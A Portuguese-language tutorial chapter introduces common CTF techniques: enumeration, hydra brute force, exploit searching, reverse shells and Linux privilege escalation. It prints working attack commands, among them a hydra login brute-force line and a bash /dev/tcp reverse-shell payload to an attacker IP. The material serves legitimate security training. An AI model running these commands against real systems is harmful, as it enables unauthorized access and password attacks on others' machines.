# 🛠️ Técnicas Úteis pra CTFs

Agora que você já fez uns labs, tá na hora de entender as **técnicas que aparecem o tempo todo**. Essas aqui são as armas básicas que você vai usar em 80% dos desafios.

---

## 🔍 Enumeração (a fase mais importante)

Antes de sair clicando e rodando exploit, **primeiro você precisa entender o alvo**. A enumeração é basicamente "fuçar tudo".

### Ferramentas e comandos:

- `nmap -sC -sV IP`: scan completo pra achar serviços e versões
- `gobuster dir -u http://IP -w wordlist.txt`: força bruta de diretórios
- `whatweb http://IP`: identifica tecnologias web
- `netcat`, `ftp`, `smbclient`, `enum4linux`: testando protocolos abertos

💡 **Dica**: quanto mais info você tiver, menos tentativa e erro depois.

---

## 🔓 Brute force e cracking

Nem sempre a senha tá escondida. Às vezes ela só tá fraca.

### Exemplos:

- `hydra`: ataque de força bruta em login
- `john` ou `hashcat`: quebrar hash de senhas (créditos ao Rick que me ensinou usar o John

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-form-post "/login:username=^USER^&password=^PASS^:F=login failed"
```


💣 Exploração (Exploiting)

Depois de descobrir a versão de um serviço ou app, você pode procurar por vulnerabilidades conhecidas.
Ferramentas:

    searchsploit: busca por exploits locais

    exploit-db.com: consulta manual

    Metasploit: uso automatizado (mas nem sempre é permitido)

```
searchsploit apache 2.4.49
```


🐚 Reverse Shell

Pra ganhar acesso ao sistema, você muitas vezes injeta um payload que te dá uma shell reversa.
Exemplo com Netcat:

No seu PC (listener):
```
nc -lvnp 4444
```
No alvo (payload):
```
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
```

🔼 Escalada de Privilégio (Privilege Escalation)

Pegou acesso como www-data? Show. Mas você quer virar root.
O que olhar:

    Arquivos com permissão errada (find / -perm -4000 -type f 2>/dev/null)

    Crontabs (cat /etc/crontab)

    Scripts executados por root (sudo -l)

    Versões vulneráveis do kernel (uname -a)

Ferramentas úteis:

    linpeas.sh

    linux-exploit-suggester.sh

    sudo -l (às vezes só isso já entrega o ouro)



🔚 Resumo

✅ Enumeração é tudo
✅ Testa credenciais simples (admin/admin)
✅ Pesquisa por exploits
✅ Usa reverse shell pra ganhar acesso
✅ Escala privilégio pra virar root

No próximo capítulo, vamos focar em escalar privilégios em detalhe.
